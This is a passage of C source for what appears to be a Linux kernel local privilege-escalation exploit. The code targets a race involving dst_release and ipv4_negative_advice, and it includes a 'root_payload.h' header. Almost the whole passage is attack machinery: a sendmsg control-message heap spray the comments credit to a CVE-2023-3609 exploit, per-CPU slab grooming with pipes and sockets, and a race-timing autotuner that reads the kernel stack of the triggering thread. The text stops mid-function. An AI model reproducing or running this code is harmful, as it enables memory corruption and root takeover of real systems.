// #include <bits/time.h>
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <string.h>
#include <stdarg.h>
#include <sys/timerfd.h>
#include <poll.h>
#include <assert.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <arpa/inet.h>
#include <limits.h>
#include <linux/futex.h>
#include <root_payload.h>

#include "rtable.h"

#ifndef MSG_PROBE
#define MSG_PROBE 0x10
#endif

#ifndef MEMBARRIER_CMD_GLOBAL
#define MEMBARRIER_CMD_GLOBAL (1 << 0)
#endif

typedef uint64_t u64;
typedef int64_t i64;
typedef uint32_t u32;
typedef int32_t i32;
typedef uint16_t u16;
typedef int16_t i16;
typedef uint8_t u8;
typedef int8_t i8;

typedef size_t usize;

#define LOG(fmt, ...) do { \
    printf(fmt "\n", ##__VA_ARGS__); \
    fflush(stdout); \
} while(0)

#define SYSCHK(x) ({                  \
    __typeof__(x) __res = (x);          \
    if (__res == (__typeof__(x))-1) {   \
        LOG("SYSCHK(" #x ") = %d\n", __res);\
        int error_val = errno;            \
        LOG("errno: %d\n", error_val);    \
        exit(1);                          \
    }                                   \
    __res;                              \
})

#define CHECK(x, n) ({                  \
    __typeof__(x) __res = (x);          \
    if (__res != n) {   \
        LOG("SYSCHK(" #x ") = %d\n", __res);\
        int error_val = errno;            \
        LOG("errno: %d\n", error_val);    \
        exit(1);                          \
    }                                   \
    __res;                              \
})

usize env_usize(const char *name, usize default_value) {
    const char *value = getenv(name);
    if (!value || !value[0]) {
        return default_value;
    }

    char *end = NULL;
    errno = 0;
    unsigned long parsed = strtoul(value, &end, 0);
    if (errno || end == value || *end != '\0') {
        LOG("Ignoring invalid %s=%s", name, value);
        return default_value;
    }

    return (usize) parsed;
}

usize online_cpu_count() {
    long online_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (online_cpus < 1) {
        return 1;
    }
    return (usize) online_cpus;
}

usize min_usize(usize a, usize b) {
    return a < b ? a : b;
}

static int trace_marker_fd = -2;
static int trace_marker_enabled = -1;
static usize trace_marker_attempt = 0;

u64 now_ns();

void trace_marker(const char *fmt, ...) {
    if (trace_marker_enabled == -1) {
        trace_marker_enabled = env_usize("BAD_DST_TRACE_MARKERS", 0) ? 1 : 0;
    }
    if (!trace_marker_enabled) {
        return;
    }

    if (trace_marker_fd == -2) {
        trace_marker_fd = open("/sys/kernel/debug/tracing/trace_marker",
                               O_WRONLY | O_CLOEXEC);
        if (trace_marker_fd == -1) {
            return;
        }
    }

    char buf[256] = { 0 };
    va_list ap;
    va_start(ap, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    if (len <= 0) {
        return;
    }
    if ((usize) len >= sizeof(buf)) {
        len = sizeof(buf) - 1;
    }

    (void) write(trace_marker_fd, buf, (usize) len);
    (void) write(trace_marker_fd, "\n", 1);
}

void sleep_us_checked(usize usec) {
    while (usec != 0) {
        useconds_t chunk = usec > 1000000 ? 1000000 : (useconds_t) usec;
        usleep(chunk);
        usec -= chunk;
    }
}

void spin_wait_ns(u64 delay_ns) {
    if (delay_ns == 0) {
        return;
    }

    u64 end_ns = now_ns() + delay_ns;
    while (now_ns() < end_ns) {}
}

bool synchronize_rcu_from_user(const char *stage) {
    if (!env_usize("BAD_DST_USE_MEMBARRIER_RCU", 1)) {
        return false;
    }

    long online_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (online_cpus <= 1) {
        return false;
    }

    errno = 0;
    long result = syscall(SYS_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1);
    if (result == 0) {
        static bool logged_success = false;
        if (!logged_success) {
            LOG("membarrier MEMBARRIER_CMD_GLOBAL RCU sync enabled");
            logged_success = true;
        }
        return true;
    }

    static bool logged_failure = false;
    if (!logged_failure) {
        LOG("membarrier RCU sync failed at %s, falling back to sleep: errno=%d", stage, errno);
        logged_failure = true;
    }
    return false;
}

void wait_for_rcu_callbacks(const char *stage, const char *extra_sleep_env, usize fallback_sleep_us) {
    long online_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (online_cpus <= 1) {
        static bool logged_single_cpu = false;
        if (!logged_single_cpu) {
            LOG("single CPU RCU wait uses delay-only path");
            logged_single_cpu = true;
        }
        sleep_us_checked(env_usize(extra_sleep_env, 50000));
        return;
    }

    if (synchronize_rcu_from_user(stage)) {
        sleep_us_checked(env_usize(extra_sleep_env, 50000));
        return;
    }

    sleep_us_checked(env_usize(extra_sleep_env, fallback_sleep_us));
}

void panic(const char *msg) {
    puts(msg);
    exit(1);
}

int pin_thread_to_cpu(pid_t pid, int cpu) {
    int rc;
    int saved_errno;
    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    cpu_set_t *cpu_setp = CPU_ALLOC(num_cpus);
    size_t size = CPU_ALLOC_SIZE(num_cpus);
    CPU_ZERO_S(size, cpu_setp);
    if (cpu >= 0 && cpu < num_cpus) {
        CPU_SET_S(cpu, size, cpu_setp);
    } else {
        for (int i = 0; i < num_cpus; i++) {
            CPU_SET_S(i, size, cpu_setp);
        }
    }

    rc = sched_setaffinity(pid, size, cpu_setp);
    saved_errno = errno;
    // if (rc) {
    //     printf("cpu %d failed to be pinned (num cpus = %d)\n", cpu, num_cpus);
    //     perror("sched_setaffinity");
    // }
    CPU_FREE(cpu_setp);
    if (rc && env_usize("BAD_DST_LOG_PIN_FAILURES", 1)) {
        LOG("pin_thread_to_cpu(pid=%d, cpu=%d, num_cpus=%d) failed: errno=%d",
            pid, cpu, num_cpus, saved_errno);
    }
    return rc;
}

int pin_to_cpu(int cpu) {
    return pin_thread_to_cpu(0, cpu);
}

void make_thread_idle() {
    struct sched_param param;

    memset(&param, 0, sizeof(param));
    SYSCHK(sched_setscheduler(0, SCHED_IDLE, &param));
}

bool try_make_thread_fifo(const char *name, int priority) {
    struct sched_param param;

    memset(&param, 0, sizeof(param));
    param.sched_priority = priority;

    int rc = sched_setscheduler(0, SCHED_FIFO, &param);
    int saved_errno = errno;
    if (rc) {
        LOG("%s: sched_setscheduler(SCHED_FIFO, prio=%d) failed errno=%d",
            name, priority, saved_errno);
        return false;
    }

    LOG("%s: using SCHED_FIFO prio=%d", name, priority);
    return true;
}

u64 now_ns() {
    struct timespec ts;

    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &ts));

    return (u64)ts.tv_sec * 1000000000ull + (u64)ts.tv_nsec;
}

void sleep_until_elapsed_us(u64 start_ns, usize elapsed_us) {
    if (elapsed_us == 0) {
        return;
    }

    u64 target_ns = start_ns + elapsed_us * 1000ull;
    u64 now = now_ns();
    if (now < target_ns) {
        sleep_us_checked((target_ns - now + 999) / 1000);
    }
}

static struct timespec ns_to_timespec(u64 ns) {
    struct timespec ts;

    ts.tv_sec = (time_t)(ns / 1000000000ull);
    ts.tv_nsec = (long)(ns % 1000000000ull);
    return ts;
}

typedef enum {
    STACK_ORACLE_UNKNOWN,
    STACK_ORACLE_TOO_EARLY,
    STACK_ORACLE_TOO_EARLY_NEAR,
    STACK_ORACLE_TARGET,
    STACK_ORACLE_TOO_LATE,
    STACK_ORACLE_TOO_LATE_FAR,
} StackOracleState;

const char *stack_oracle_state_name(StackOracleState state) {
    switch (state) {
    case STACK_ORACLE_TOO_EARLY_NEAR:
        return "too_early_near";
    case STACK_ORACLE_TOO_EARLY:
        return "too_early";
    case STACK_ORACLE_TARGET:
        return "target";
    case STACK_ORACLE_TOO_LATE_FAR:
        return "too_late_far";
    case STACK_ORACLE_TOO_LATE:
        return "too_late";
    default:
        return "unknown";
    }
}

bool parse_stack_offset(const char *stack, const char *symbol, unsigned long *offset) {
    const char *p = stack;
    size_t symbol_len = strlen(symbol);

    while ((p = strstr(p, symbol)) != NULL) {
        const char *plus = p + symbol_len;
        if (plus[0] == '+' && plus[1] == '0' && plus[2] == 'x') {
            char *end = NULL;
            errno = 0;
            unsigned long parsed = strtoul(plus + 3, &end, 16);
            if (!errno && end != plus + 3) {
                *offset = parsed;
                return true;
            }
        }
        p += symbol_len;
    }

    return false;
}

StackOracleState classify_trigger_stack(const char *stack) {
    unsigned long offset = 0;

    if (parse_stack_offset(stack, "dst_release", &offset)) {
        return offset >= 0x18 ? STACK_ORACLE_TARGET : STACK_ORACLE_TOO_EARLY;
    }

    if (parse_stack_offset(stack, "ipv4_negative_advice", &offset)) {
        if (env_usize("BAD_DST_REQUIRE_DST_RELEASE_FRAME", 0)) {
            return STACK_ORACLE_UNKNOWN;
        }
        if (offset >= 0x2a) {
            return STACK_ORACLE_TARGET;
        }
        if (offset >= 0x1a) {
            return STACK_ORACLE_TOO_EARLY_NEAR;
        }
        return STACK_ORACLE_TOO_EARLY;
    }

    if (parse_stack_offset(stack, "sock_setsockopt", &offset)) {
        if (offset >= 0x1025 && offset <= 0x1036) {
            return STACK_ORACLE_TOO_EARLY_NEAR;
        }
        if (offset < 0xefb) {
            if (offset >= 0xec8) {
                return STACK_ORACLE_TOO_EARLY_NEAR;
            }
            return STACK_ORACLE_TOO_EARLY;
        }
        if (offset < 0xf09) {
            if (env_usize("BAD_DST_STRONG_STACK_TARGET_ONLY", 0)) {
                return STACK_ORACLE_UNKNOWN;
            }
            return STACK_ORACLE_TARGET;
        }
        return STACK_ORACLE_TOO_LATE;
    }

    if (strstr(stack, "timerfd_settime") ||
        strstr(stack, "security_socket_setsockopt") ||
        strstr(stack, "sockfd_lookup_light") ||
        strstr(stack, "__fget_light")) {
        return STACK_ORACLE_TOO_EARLY;
    }

    if (strstr(stack, "pipe_read") ||
        strstr(stack, "exit_to_user_mode_prepare") ||
        strstr(stack, "irqentry_exit_to_user_mode")) {
        return STACK_ORACLE_TOO_LATE_FAR;
    }

    return STACK_ORACLE_UNKNOWN;
}

StackOracleState read_trigger_stack_oracle(pid_t tid) {
    char path[64] = { 0 };
    char stack[4096] = { 0 };

    snprintf(path, sizeof(path), "/proc/%d/stack", tid);
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        LOG("stack oracle unavailable: open(%s) errno=%d", path, errno);
        return STACK_ORACLE_UNKNOWN;
    }

    ssize_t n = read(fd, stack, sizeof(stack) - 1);
    int saved_errno = errno;
    close(fd);
    if (n < 0) {
        LOG("stack oracle unavailable: read(%s) errno=%d", path, saved_errno);
        return STACK_ORACLE_UNKNOWN;
    }

    stack[n] = '\0';

    StackOracleState state = classify_trigger_stack(stack);
    if (env_usize("BAD_DST_STACK_ORACLE_VERBOSE", 0) ||
        (state == STACK_ORACLE_TARGET &&
         env_usize("BAD_DST_STACK_ORACLE_VERBOSE_TARGET", 0))) {
        LOG("trigger stack:\n%s", stack);
    }

    LOG("stack oracle: %s", stack_oracle_state_name(state));
    return state;
}

typedef enum {
    LOCK_ORACLE_DONE_OK,
    LOCK_ORACLE_DONE_ERR,
    LOCK_ORACLE_BLOCKED,
    LOCK_ORACLE_FAILED,
} LockOracleState;

typedef struct {
    LockOracleState state;
    pid_t pid;
    int result_errno;
} LockOracleResult;

const char *lock_oracle_state_name(LockOracleState state) {
    switch (state) {
    case LOCK_ORACLE_DONE_OK:
        return "done_ok";
    case LOCK_ORACLE_DONE_ERR:
        return "done_err";
    case LOCK_ORACLE_BLOCKED:
        return "blocked";
    default:
        return "failed";
    }
}

bool wait_for_child_exit(pid_t pid, usize timeout_us) {
    if (pid <= 0) {
        return true;
    }

    u64 deadline = now_ns() + timeout_us * 1000ull;
    for (;;) {
        int status = 0;
        pid_t got = waitpid(pid, &status, WNOHANG);
        if (got == pid) {
            return true;
        }
        if (got == -1 && errno == ECHILD) {
            return true;
        }
        if (now_ns() >= deadline) {
            return false;
        }
        sleep_us_checked(1000);
    }
}

void close_inherited_fds_except(int keep_fd) {
    struct rlimit rl = { 0 };
    usize max_fds = 32768;

    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 &&
        rl.rlim_cur != RLIM_INFINITY &&
        rl.rlim_cur > 0) {
        max_fds = (usize) rl.rlim_cur;
    }

    for (usize fd = 3; fd < max_fds; fd++) {
        if ((int) fd != keep_fd) {
            close((int) fd);
        }
    }
}

LockOracleResult run_ip_mtu_lock_oracle(int socket_fd, usize timeout_us) {
    LockOracleResult result = {
        .state = LOCK_ORACLE_FAILED,
        .pid = -1,
        .result_errno = 0,
    };

    pid_t pid = fork();
    if (pid == -1) {
        LOG("lock oracle fork failed: errno=%d", errno);
        return result;
    }

    if (pid == 0) {
        if (env_usize("BAD_DST_LOCK_ORACLE_CLOSE_FDS", 1)) {
            close_inherited_fds_except(socket_fd);
        }

        int mtu = 0;
        socklen_t mtu_len = sizeof(mtu);
        long rc = syscall(SYS_getsockopt, socket_fd, IPPROTO_IP, IP_MTU, &mtu, &mtu_len);
        _exit(rc == 0 ? 0 : (errno ? (errno & 0xff) : 1));
    }

    result.pid = pid;
    u64 deadline = now_ns() + timeout_us * 1000ull;
    for (;;) {
        int status = 0;
        pid_t got = waitpid(pid, &status, WNOHANG);
        if (got == pid) {
            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                result.state = LOCK_ORACLE_DONE_OK;
                result.result_errno = 0;
            } else if (WIFEXITED(status)) {
                result.state = LOCK_ORACLE_DONE_ERR;
                result.result_errno = WEXITSTATUS(status);
            } else {
                result.state = LOCK_ORACLE_FAILED;
                result.result_errno = 0;
            }
            result.pid = -1;
            return result;
        }

        if (got == -1) {
            result.state = LOCK_ORACLE_FAILED;
            result.result_errno = errno;
            result.pid = -1;
            return result;
        }

        if (now_ns() >= deadline) {
            result.state = LOCK_ORACLE_BLOCKED;
            return result;
        }

        sleep_us_checked(1000);
    }
}

void adjust_timer_offset(u64 *timer_offset, StackOracleState reason) {
    if (!env_usize("BAD_DST_RACE_AUTOTUNE", 1)) {
        return;
    }

    usize early_step = env_usize("BAD_DST_TIMER_EARLY_STEP_NS", 15013);
    usize near_early_step = env_usize("BAD_DST_TIMER_NEAR_EARLY_STEP_NS", 211);
    usize late_step = env_usize("BAD_DST_TIMER_LATE_STEP_NS", 23);
    usize far_late_step = env_usize("BAD_DST_TIMER_FAR_LATE_STEP_NS", 15013);

    static bool have_early_bound = false;
    static bool have_late_bound = false;
    static u64 early_bound = 0;
    static u64 late_bound = 0;

    if (reason == STACK_ORACLE_TOO_EARLY || reason == STACK_ORACLE_TOO_EARLY_NEAR) {
        if (!have_early_bound || *timer_offset > early_bound) {
            early_bound = *timer_offset;
            have_early_bound = true;
        }
    } else if (reason == STACK_ORACLE_TOO_LATE || reason == STACK_ORACLE_TOO_LATE_FAR) {
        if (!have_late_bound || *timer_offset < late_bound) {
            late_bound = *timer_offset;
            have_late_bound = true;
        }
    }

    if (have_early_bound && have_late_bound && early_bound < late_bound) {
        u64 next = early_bound + (late_bound - early_bound) / 2;
        if (next == *timer_offset) {
            if (reason == STACK_ORACLE_TOO_EARLY || reason == STACK_ORACLE_TOO_EARLY_NEAR) {
                next += 1;
            } else if (next > 1) {
                next -= 1;
            }
        }
        *timer_offset = next;
        LOG("timer offset bracket early=%lu late=%lu next=%lu",
            early_bound, late_bound, *timer_offset);
        return;
    }

    if (reason == STACK_ORACLE_TOO_EARLY_NEAR) {
        *timer_offset += near_early_step;
        LOG("timer offset increased to %lu", *timer_offset);
    } else if (reason == STACK_ORACLE_TOO_EARLY) {
        *timer_offset += early_step;
        LOG("timer offset increased to %lu", *timer_offset);
    } else if (reason == STACK_ORACLE_TOO_LATE_FAR) {
        *timer_offset = *timer_offset > far_late_step ?
            *timer_offset - far_late_step : 1;
        LOG("timer offset decreased to %lu", *timer_offset);
    } else if (reason == STACK_ORACLE_TOO_LATE) {
        *timer_offset = *timer_offset > late_step ?
            *timer_offset - late_step : 1;
        LOG("timer offset decreased to %lu", *timer_offset);
    }
}

u64 timer_offset_for_attempt(u64 current_offset, usize attempt) {
    usize sweep_count = env_usize("BAD_DST_TIMER_SWEEP_COUNT", 0);
    if (sweep_count == 0) {
        return current_offset;
    }

    u64 sweep_start = env_usize("BAD_DST_TIMER_SWEEP_START_NS", current_offset);
    u64 sweep_step = env_usize("BAD_DST_TIMER_SWEEP_STEP_NS", 1000);
    usize sweep_index = (attempt - 1) % sweep_count;

    return sweep_start + sweep_index * sweep_step;
}

u64 race_pulse_ns_for_attempt(usize attempt) {
    usize sweep_count = env_usize("BAD_DST_RACE_PULSE_SWEEP_COUNT", 0);
    if (sweep_count == 0) {
        return env_usize("BAD_DST_RACE_PULSE_NS", 0);
    }

    u64 sweep_start = env_usize("BAD_DST_RACE_PULSE_START_NS", 0);
    u64 sweep_step = env_usize("BAD_DST_RACE_PULSE_STEP_NS", 1000);
    usize sweep_index = (attempt - 1) % sweep_count;

    return sweep_start + sweep_index * sweep_step;
}


typedef struct {
    int read_fd;
    int write_fd;
} Pipe;

Pipe open_pipe() {
    int fds[2] = { 0 };
    SYSCHK(pipe(fds));
    Pipe pipe = {
        .read_fd = fds[0],
        .write_fd = fds[1],
    };
    return pipe;
}

void pipe_close(Pipe *pipe) {
    SYSCHK(close(pipe->read_fd));
    SYSCHK(close(pipe->write_fd));
}

void pipe_set_buf_size(Pipe *pipe, usize size) {
    CHECK(fcntl(pipe->write_fd, F_SETPIPE_SZ, size), size);
}

void pipe_prefault(Pipe *pipe) {
    u8 buf = 0;
    SYSCHK(write(pipe->write_fd, &buf, sizeof(buf)));
    CHECK(read(pipe->read_fd, &buf, sizeof(buf)), sizeof(buf));
}

bool pipe_readable_bytes(Pipe *pipe, int *size) {
    *size = 0;
    if (ioctl(pipe->write_fd, FIONREAD, size) == -1) {
        return false;
    }
    return true;
}

void pipe_write_one_active_buffer(Pipe *pipe) {
    u8 buf = 0;
    ssize_t written = write(pipe->write_fd, &buf, sizeof(buf));
    if (written != (ssize_t) sizeof(buf)) {
        LOG("failed to create active pipe buffer: written=%ld errno=%d", (long) written, errno);
        exit(1);
    }
}

void pipe_fill_three_active_buffers(Pipe *pipe) {
    static u8 fill[0x1000] = { 0 };

    SYSCHK(write(pipe->write_fd, fill, 0x1000 - 1));
    for (usize i = 0; i < 2; i++) {
        SYSCHK(write(pipe->write_fd, fill, 0x1000));
    }
}

void verify_vuln_pipes_active(Pipe *pipes, usize count, const char *stage) {
    if (!env_usize("BAD_DST_VERIFY_VULN_PIPE_ACTIVE", 1)) {
        return;
    }

    for (usize i = 0; i < count; i++) {
        int readable = 0;
        if (!pipe_readable_bytes(&pipes[i], &readable)) {
            LOG("vuln pipe active check failed at %s index=%lu: ioctl errno=%d", stage, i, errno);
            exit(1);
        }

        if (readable != 1) {
            LOG("vuln pipe active check failed at %s index=%lu: readable=%d", stage, i, readable);
            exit(1);
        }
    }
}

#define NUM_SPRAY 0xa00
#define SPRAY_SIZE 0x100

// sendmsg spray adapted from CVE-2023-3609 exploit
// payload to send on socket
u8 dummy_buf[0x1000] = { 0 };

// payload sprayed to overlap with
u8 payload[SPRAY_SIZE] = { 0 };
u8 payload_variants[2][SPRAY_SIZE] = { 0 };

int control_socket[2] = { 0 };
int spray_sockets[NUM_SPRAY][2] = { 0 };
atomic_int spray_count = 0;
atomic_int spray_payload_variant_count = 0;
bool spray_threads_ready = false;

void init_control_payload(u8 *control_payload) {
    memset(control_payload, 0, SPRAY_SIZE);

    struct cmsghdr *control_header = (struct cmsghdr *) control_payload;
    control_header->cmsg_len = SPRAY_SIZE;
    control_header->cmsg_level = 0;
    control_header->cmsg_type = 0;
}

void *spray_thread(void *x) {
    size_t index = (size_t)x;
    usize cpus = online_cpu_count();
    usize cpu = env_usize("BAD_DST_SPRAY_CPU", 0);
    if (env_usize("BAD_DST_SPRAY_PERCPU", 0) && cpus != 0) {
        cpu = index % cpus;
    }
    pin_to_cpu((int) (cpu % cpus));

    for (;;) {
        write(control_socket[0], dummy_buf, 1);
        read(control_socket[0], dummy_buf, 1);

        struct iovec iov = {
            .iov_base = dummy_buf,
            .iov_len = sizeof(dummy_buf),
        };

        u8 *control_payload = payload;
        int variant_count = atomic_load(&spray_payload_variant_count);
        if (variant_count > 0) {
            control_payload = payload_variants[index % (usize) variant_count];
        }

        struct msghdr msg = {
            .msg_iov = &iov,
            .msg_iovlen = 1,
            .msg_control = control_payload,
            .msg_controllen = SPRAY_SIZE,
        };

        atomic_fetch_add(&spray_count, 1);
        sendmsg(spray_sockets[index][1], &msg, 0);
    }

    return NULL;
}

void setup_spray() {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, control_socket));

    init_control_payload(payload);
    init_control_payload(payload_variants[0]);
    init_control_payload(payload_variants[1]);
    memset(dummy_buf, 0, sizeof(dummy_buf));

    LOG("spray pinning: cpu=%lu percpu=%lu",
        env_usize("BAD_DST_SPRAY_CPU", 0),
        env_usize("BAD_DST_SPRAY_PERCPU", 0));

    for (usize i = 0; i < NUM_SPRAY; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockets[i]));

        u32 buf_size = 0x800;
        SYSCHK(setsockopt(spray_sockets[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&buf_size, sizeof(buf_size)));
        SYSCHK(setsockopt(spray_sockets[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&buf_size, sizeof(buf_size)));
        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
    }

    atomic_store(&spray_count, 0);

    pthread_t tid = 0;
    for (usize i = 0; i < NUM_SPRAY; i++) {
        pthread_create(&tid, 0, spray_thread, (void *)i);
        pthread_detach(tid);
    }

    // wait for threads to get setup
    spray_threads_ready = false;
    int to_read = NUM_SPRAY;
    while (to_read > 0) {
        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
    }
    spray_threads_ready = true;
}

void do_spray() {
    if (!spray_threads_ready) {
        panic("spray threads are not parked");
    }

    atomic_store(&spray_count, 0);
    spray_threads_ready = false;
    write(control_socket[1], dummy_buf, NUM_SPRAY);

    // wait for spray to finish
    // atomic at least indicates all threads run, but not necessarily all sendmsg called
    // extra sleep is good safeguard that makes it very likely all messages sent
    while (atomic_load(&spray_count) != NUM_SPRAY) {}
    sleep_us_checked(env_usize("BAD_DST_SPRAY_BLOCK_US", 1000000));
}

// fees sprayed heap items
void free_spray() {
    // Drain the filler datagrams. This unblocks the sendmsg threads; once they
    // report ready again, their per-sendmsg control allocations have been freed.
    for (usize i = 0; i < NUM_SPRAY; i++) {
        SYSCHK(read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf)));
    }

    int to_read = NUM_SPRAY;
    while (to_read > 0) {
        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
    }
    spray_threads_ready = true;
}

// resets spray threads back to initial state after setup spray
void reset_spray() {
    if (!spray_threads_ready) {
        int to_read = NUM_SPRAY;
        while (to_read > 0) {
            to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
        }
        spray_threads_ready = true;
    }

    for (usize i = 0; i < NUM_SPRAY; i++) {
        // drain remaining cmsg message
        SYSCHK(read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf)));
        // write back first message
        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
    }

    atomic_store(&spray_count, 0);
}

#define MAX_GROOM_CPUS 32

typedef struct {
    int cpu;
    int fds[2];
    atomic_int *ready_counter;
} CmsgGroomArg;

typedef struct {
    int cpu;
    usize count;
    Pipe *pipes;
} PipeGroomArg;

typedef struct {
    Pipe *pipes;
    usize start;
    usize end;
    int cpu;
    u8 *buf;
} PageReclaimArg;

static CmsgGroomArg *held_cmsg_grooms = NULL;
static usize held_cmsg_groom_count = 0;
static Pipe *held_pipe192_grooms = NULL;
static usize held_pipe192_groom_count = 0;

void pthread_create_or_die(pthread_t *tid, void *(*fn)(void *), void *arg) {
    int rc = pthread_create(tid, NULL, fn, arg);
    if (rc != 0) {
        errno = rc;
        perror("pthread_create");
        exit(1);
    }
}

void prepare_blocking_cmsg_socket(int fds[2]) {
    SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, fds));

    u32 buf_size = 0x800;
    SYSCHK(setsockopt(fds[1], SOL_SOCKET, SO_SNDBUF, (char *)&buf_size, sizeof(buf_size)));
    SYSCHK(setsockopt(fds[0], SOL_SOCKET, SO_RCVBUF, (char *)&buf_size, sizeof(buf_size)));
    write(fds[1], dummy_buf, sizeof(dummy_buf));
}

void *cmsg_groom_thread(void *arg) {
    CmsgGroomArg *groom = (CmsgGroomArg *) arg;
    pin_to_cpu(groom->cpu);

    struct iovec iov = {
        .iov_base = dummy_buf,
        .iov_len = sizeof(dummy_buf),
    };

    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = sizeof(payload),
    };

    atomic_fetch_add(groom->ready_counter, 1);
    sendmsg(groom->fds[1], &msg, 0);

    return NULL;
}

void release_cmsg_grooms(CmsgGroomArg *grooms, pthread_t *threads, usize count) {
    for (usize i = 0; i < count; i++) {
        SYSCHK(read(grooms[i].fds[0], dummy_buf, sizeof(dummy_buf)));
    }

    for (usize i = 0; i < count; i++) {
        pthread_join(threads[i], NULL);
        SYSCHK(close(grooms[i].fds[0]));
        SYSCHK(close(grooms[i].fds[1]));
    }
}

void churn_cmsg_partials_per_cpu(usize cpus, usize per_cpu) {
    if (per_cpu == 0) {
        return;
    }

    usize count = cpus * per_cpu;
    CmsgGroomArg *grooms = calloc(count, sizeof(*grooms));
    pthread_t *threads = calloc(count, sizeof(*threads));
    if (!grooms || !threads) {
        panic("failed to allocate cmsg groom state");
    }

    atomic_int ready_counter = 0;
    usize index = 0;
    for (usize cpu = 0; cpu < cpus; cpu++) {
        for (usize i = 0; i < per_cpu; i++) {
            grooms[index].cpu = (int) cpu;
            grooms[index].ready_counter = &ready_counter;
            prepare_blocking_cmsg_socket(grooms[index].fds);
            pthread_create_or_die(&threads[index], cmsg_groom_thread, &grooms[index]);
            index++;
        }
    }

    while ((usize) atomic_load(&ready_counter) != count) {}
    sleep_us_checked(env_usize("BAD_DST_GROOM_BLOCK_US", 200000));
    release_cmsg_grooms(grooms, threads, count);

    free(threads);
    free(grooms);
}

void hold_cmsg_active_slabs_per_cpu(usize cpus, usize per_cpu) {
    if (per_cpu == 0 || held_cmsg_groom_count != 0) {
        return;
    }

    usize count = cpus * per_cpu;
    held_cmsg_grooms = calloc(count, sizeof(*held_cmsg_grooms));
    pthread_t *threads = calloc(count, sizeof(*threads));
    if (!held_cmsg_grooms || !threads) {
        panic("failed to allocate held cmsg groom state");
    }

    atomic_int ready_counter = 0;
    usize index = 0;
    for (usize cpu = 0; cpu < cpus; cpu++) {
        for (usize i = 0; i < per_cpu; i++) {
            held_cmsg_grooms[index].cpu = (int) cpu;
            held_cmsg_grooms[index].ready_counter = &ready_counter;
            prepare_blocking_cmsg_socket(held_cmsg_grooms[index].fds);
            pthread_create_or_die(&threads[index], cmsg_groom_thread, &held_cmsg_grooms[index]);
            pthread_detach(threads[index]);
            index++;
        }
    }

    while ((usize) atomic_load(&ready_counter) != count) {}
    sleep_us_checked(env_usize("BAD_DST_GROOM_BLOCK_US", 200000));
    held_cmsg_groom_count = count;
    free(threads);
}

void *pipe192_hold_thread(void *arg) {
    PipeGroomArg *groom = (PipeGroomArg *) arg;
    pin_to_cpu(groom->cpu);

    for (usize i = 0; i < groom->count; i++) {
        groom->pipes[i] = open_pipe();
        pipe_set_buf_size(&groom->pipes[i], 0x1000);
        pipe_set_buf_size(&groom->pipes[i], 4 * 0x1000);
    }

    return NULL;
}

void *pipe192_churn_thread(void *arg) {
    PipeGroomArg *groom = (PipeGroomArg *) arg;
    Pipe *pipes = calloc(groom->count, sizeof(*pipes));
    if (!pipes) {
        panic("failed to allocate pipe groom state");
    }

    pin_to_cpu(groom->cpu);
    for (usize i = 0; i < groom->count; i++) {
        pipes[i] = open_pipe();
        pipe_set_buf_size(&pipes[i], 0x1000);
        pipe_set_buf_size(&pipes[i], 4 * 0x1000);
    }

    for (usize i = 0; i < groom->count; i++) {
        pipe_close(&pipes[i]);
    }

    free(pipes);
    return NULL;
}

void churn_pipe192_partials_per_cpu(usize cpus, usize per_cpu) {
    if (per_cpu == 0) {
        return;
    }

    PipeGroomArg args[MAX_GROOM_CPUS] = { 0 };
    pthread_t threads[MAX_GROOM_CPUS] = { 0 };

    for (usize cpu = 0; cpu < cpus; cpu++) {
        args[cpu].cpu = (int) cpu;
        args[cpu].count = per_cpu;
        pthread_create_or_die(&threads[cpu], pipe192_churn_thread, &args[cpu]);
    }

    for (usize cpu = 0; cpu < cpus; cpu++) {
        pthread_join(threads[cpu], NULL);
    }
}

void hold_pipe192_active_slabs_per_cpu(usize cpus, usize per_cpu) {
    if (per_cpu == 0 || held_pipe192_groom_count != 0) {
        return;
    }

    usize count = cpus * per_cpu;
    held_pipe192_grooms = calloc(count, sizeof(*held_pipe192_grooms));
    if (!held_pipe192_grooms) {
        panic("failed to allocate held pipe groom state");
    }

    PipeGroomArg args[MAX_GROOM_CPUS] = { 0 };
    pthread_t threads[MAX_GROOM_CPUS] = { 0 };

    for (usize cpu = 0; cpu < cpus; cpu++) {
        args[cpu].cpu = (int) cpu;
        args[cpu].count = per_cpu;
        args[cpu].pipes = &held_pipe192_grooms[cpu * per_cpu];
        pthread_create_or_die(&threads[cpu], pipe192_hold_thread, &args[cpu]);
    }

    for (usize cpu = 0; cpu < cpus; cpu++) {
        pthread_join(threads[cpu], NULL);
    }

    held_pipe192_groom_count = count;
}

void setup_smp_allocator_grooming() {
